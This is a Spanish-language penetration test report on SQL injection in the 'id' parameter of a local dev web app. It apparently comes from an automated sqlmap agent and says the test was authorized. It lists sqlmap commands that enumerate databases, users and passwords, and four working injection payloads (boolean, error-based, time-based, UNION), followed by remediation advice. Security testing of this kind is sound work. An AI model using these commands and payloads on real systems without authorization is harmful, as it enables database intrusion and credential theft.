# Informe de prueba SQLi — web.dev.local:8083

Fecha: 2026-04-13T10:00:58Z

## Resumen Ejecutivo
Se realizó un escaneo DAST orientado a SQL Injection sobre http://web.dev.local:8083. Se confirmó que el parámetro GET "id" en la página principal es vulnerable a SQLi (MySQL). Se logró enumerar el usuario actual de la base de datos y la lista de bases de datos, pero no se lograron extraer credenciales (usuarios/contraseñas) ni volcados de tablas completas debido a limitaciones en las técnicas de extracción.

## Metodología
1. Reconocimiento: se descargó la página raíz y se identificó un formulario GET con el parámetro "id".
2. Escaneo: sqlmap con --batch para comprobar inyectabilidad.
3. Explotación: intentos de enumeración (--dbs, --tables, --dump) sólo si sqlmap confirmaba vulnerabilidad.
4. Reporte: este documento.

## Vectores analizados
- GET parameter: http://web.dev.local:8083/?id=<value> (campo del formulario con name="id").

## Comandos ejecutados (resumen)
- curl http://web.dev.local:8083 (reconocimiento)
- sqlmap -u "http://web.dev.local:8083/?id=1" --batch --level=3 --risk=2 --threads=2
- sqlmap -u "http://web.dev.local:8083/?id=1" --batch --dbs --current-user --users --passwords
- sqlmap -u "http://web.dev.local:8083/?id=1" --batch -D sqli_demo --tables

## Hallazgos
- Vulnerabilidad: SQL Injection confirmada en parámetro GET "id".
- Tipo(s) de inyección detectadas (según sqlmap):
  - boolean-based blind
  - error-based (EXTRACTVALUE)
  - time-based blind (SLEEP)
  - UNION-based (parcial)

### Payloads relevantes detectados por sqlmap
- boolean-based example: id=2352' OR NOT 7247=7247#&Submit=Submit
- error-based example: id=2352' AND EXTRACTVALUE(4611,CONCAT(0x5c,0x7176627171,(SELECT (ELT(4611=4611,1))),0x7171767871))-- EpGx&Submit=Submit
- time-based example: id=2352' AND (SELECT 8276 FROM (SELECT(SLEEP(5)))fFmn)-- zOtb&Submit=Submit
- UNION example: id=2352' UNION ALL SELECT CONCAT(...),NULL#&Submit=Submit

## Evidencia de explotación
- sqlmap recuperó el usuario actual de la BD:
  - current user: 'root@%'
- Bases de datos recuperadas:
  - information_schema
  - mysql
  - performance_schema
  - sqli_demo
  - sys

- Intentos para enumerar tablas en 'sqli_demo' y para volcar datos fallaron con mensajes de sqlmap indicando problemas con la técnica UNION/full y recomendaciones de usar --hex o --no-cast. También aparecieron advertencias en payloads basados en tiempo (requerimiento de modelo estadístico mayor).

No se han extraído nombres de usuarios y contraseñas ni se han volcado tablas completas en este análisis automatizado.

## Conclusión y recomendaciones
- Conclusión: VULN encontrada en parámetro id (SQLi). Impacto: acceso a información de bases de datos, posibilidad de escalado con técnicas adicionales.

- Recomendaciones inmediatas:
  1. Validar y sanear/parametrizar todas las entradas del parámetro "id" (usar consultas preparadas / ORM con parámetros).
  2. Aplicar principio de menor privilegio al usuario de la BD (evitar root@% en producción).
  3. Revisar logs para detectar explotación previa.
  4. Realizar pruebas adicionales manuales y con sqlmap con opciones --hex/--no-cast y --risk/--level ajustadas si se desea intentar extracción completa en un entorno de pruebas controlado.

## Archivos y evidencias generadas
- sqlmap output directory: /root/.local/share/sqlmap/output/web.dev.local
- Archivos guardados automáticamente por sqlmap (log, session.sqlite, target.txt)


---
Informe generado por agente DAST (sqlmap) en entorno autorizado.
